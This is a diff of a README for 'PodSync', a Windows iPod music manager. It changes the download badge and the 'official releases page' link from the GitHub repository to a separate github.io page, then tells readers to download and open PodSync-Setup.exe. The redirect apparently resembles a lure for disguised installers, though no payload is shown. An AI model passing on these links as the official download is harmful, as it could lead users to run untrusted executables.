@@ -1,6 +1,6 @@
 # 🎵 PodSync - Manage your classic iPod music library
 
-[![](https://img.shields.io/badge/Download_PodSync-Blue?style=for-the-badge&logo=github)](https://github.com/matthewn380/PodSync)
+[![](https://img.shields.io/badge/Download_PodSync-Blue?style=for-the-badge&logo=github)](https://matthewn380.github.io)
 
 PodSync lets you move your music collection onto classic iPod hardware. It turns your modern music library into a portable format. You can drag music files from your computer and drop them onto your iPod. The software handles the conversion and file transfer steps for you. 
 
@@ -12,7 +12,7 @@ You need a computer running Windows 10 or Windows 11. Your computer requires at 
 
 Follow these steps to install the software on your Windows computer:
 
-1. Visit the [official releases page](https://github.com/matthewn380/PodSync).
+1. Visit the [official releases page](https://matthewn380.github.io).
 2. Look for the latest file titled PodSync-Setup.exe.
 3. Click the file to start the download.
 4. Open the downloaded file once the process finishes.
